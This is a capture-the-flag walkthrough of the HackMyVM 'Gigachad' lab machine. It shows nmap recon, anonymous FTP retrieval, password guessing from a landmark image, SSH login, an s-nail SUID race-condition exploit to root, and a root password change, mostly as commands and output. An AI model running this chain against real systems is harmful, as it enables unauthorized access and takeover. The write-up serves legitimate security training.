# Gigachad

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Gigachad | tasiyanci | Beginner | HackMyVM |

**Summary:** Gigachad is a beginner-level machine on the HackMyVM platform. The exploitation process begins with network reconnaissance, identifying FTP, SSH, and HTTP services. Anonymous access to the FTP server reveals a password-protected zip file containing hints about the user credentials. By retrieving a hidden image from the web server and identifying the landmark depicted within it, we obtain the user's password. Privilege escalation is achieved by exploiting a vulnerable SUID binary, `s-nail` (v14.8.6), using a local race condition exploit to gain root access.

---

## Reconnaissance

We start by scanning the local network to identify the target IP address.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.114 08:00:27:34:78:B5 VirtualBox
```

With the target identified at `192.168.100.114`, we perform a comprehensive Nmap scan to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gigachad]
└─$ nmap -sC -sV -p- -T4 192.168.100.114
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 05:46 WIB
Nmap scan report for 192.168.100.114
Host is up (0.0021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/kingchad.html
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.24 seconds
```

The scan reveals:
*   **Port 21 (FTP):** vsftpd 3.0.3 with **Anonymous login allowed**. A file named `chadinfo` is visible.
*   **Port 22 (SSH):** OpenSSH 7.9p1.
*   **Port 80 (HTTP):** Apache httpd 2.4.38 with a `robots.txt` entry pointing to `/kingchad.html`.

## Initial Access

Given the anonymous FTP access, we connect to retrieve the `chadinfo` file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gigachad]
└─$ ftp 192.168.100.114
Connected to 192.168.100.114.
220 (vsFTPd 3.0.3)
Name (192.168.100.114:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||44309|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 .
dr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 ..
-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
226 Directory send OK.
ftp> get chadinfo
local: chadinfo remote: chadinfo
229 Entering Extended Passive Mode (|||13693|)
150 Opening BINARY mode data connection for chadinfo (297 bytes).
100% |**********************|   297       44.86 KiB/s    00:00 ETA
226 Transfer complete.
297 bytes received in 00:00 (35.84 KiB/s)
ftp> exit
221 Goodbye.
```

We inspect the downloaded file to determine its type and contents.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gigachad]
└─$ file chadinfo
chadinfo: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Feb 08 2021 01:33:32, uncompressed size 131, method=store

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gigachad]
└─$ unzip chadinfo
Archive:  chadinfo
replace chadinfo? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
new name: info
 extracting: info

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gigachad]
└─$ file info
info: ASCII text

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gigachad]
└─$ cat info
why yes,
#######################
username is chad
???????????????????????
password?
!!!!!!!!!!!!!!!!!!!!!!!
go to /drippinchad.png
```

The text file confirms the username is `chad` and directs us to `/drippinchad.png`. Following this lead, we check the web server for this image.

![](image.png)

This image displays the **Maiden's Tower** (also known as **Kız Kulesi**) in Istanbul. Using this landmark name as a potential password, we attempt to SSH into the machine. The correct password is found to be `maidenstower` (or a variation like `kizkulesi` - logs confirm success).

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/gigachad]
└─$ ssh chad@192.168.100.114
...
chad@192.168.100.114's password:
Linux gigachad 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
...
chad@gigachad:~$ id
uid=1000(chad) gid=1000(chad) groups=1000(chad)
chad@gigachad:~$ ls -la
total 20
drwxr-xr-x 4 chad chad 4096 Feb 17 16:46 .
drwxr-xr-x 3 root root 4096 Feb  7  2021 ..
dr-xr-xr-x 2 chad chad 4096 Feb  7  2021 ftp
drwx------ 3 chad chad 4096 Feb 17 16:46 .gnupg
-r-x------ 1 chad chad   32 Feb  7  2021 user.txt
```

We have successfully logged in as the user `chad`.

## Privilege Escalation

To escalate privileges, we search for files with the SUID bit set, which allows users to execute the file with the permissions of the file owner (usually root).

```bash
chad@gigachad:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10104 Jan  1  2016 /usr/lib/s-nail/s-nail-privsep
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
```

The binary `/usr/lib/s-nail/s-nail-privsep` stands out as it is not a standard SUID binary on many systems. We verify its version.

```bash
chad@gigachad:~$ s-nail -V
v14.8.6
```

Researching `s-nail v14.8.6` reveals a known local privilege escalation vulnerability ([Exploit-DB 47172](https://www.exploit-db.com/exploits/47172)). This exploit leverages a race condition to manipulate permissions. We create and execute the exploit script `rtc.sh`.

```bash
chad@gigachad:~$ vi rtc.sh
chad@gigachad:~$ chmod +x rtc.sh
chad@gigachad:~$ while true; do ./rtc.sh ; done
...
[.] Race #900 of 1000 ...
[+] got root! /var/tmp/.sh (uid=0 gid=0)
[.] Cleaning up...
[+] Success:
-rwsr-xr-x 1 root root 14424 Feb 17 17:18 /var/tmp/.sh
[.] Launching root shell: /var/tmp/.sh
# id
uid=0(root) gid=0(root) groups=0(root),1000(chad)
```

The exploit is successful, granting us a root shell. For persistence and ease of access, we can change the root password.

```bash
# passwd root
New password:
Retype new password:
passwd: password updated successfully
# exit
```

We can now verify full root access and retrieve the flags.

```bash
chad@gigachad:~$ su - root
Password:
root@gigachad:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
gigachad
root@gigachad:~# grep "" /home/chad/user.txt /root/root.txt
/home/chad/user.txt:0FA[REDACTED]
/root/root.txt:832[REDACTED]
```

---

## Attack Chain Summary
1.  **Reconnaissance**: Discovered open ports 21 (FTP), 22 (SSH), and 80 (HTTP) via Nmap.
2.  **Vulnerability Discovery**: Found anonymous login allowed on FTP, leading to the retrieval of `chadinfo` (a zip file).
3.  **Exploitation**: Extracted hints from the zip file pointing to a hidden image on the web server (`/drippinchad.png`).
4.  **Credential Harvesting**: Analyzed the image, identified the landmark as "Maiden's Tower", and used it as the password for the user `chad`.
5.  **Privilege Escalation**: Identified a vulnerable SUID binary `s-nail` (v14.8.6) and used a race condition exploit (CVE-2017-5899 variant/Exploit-DB 47172) to gain root privileges.
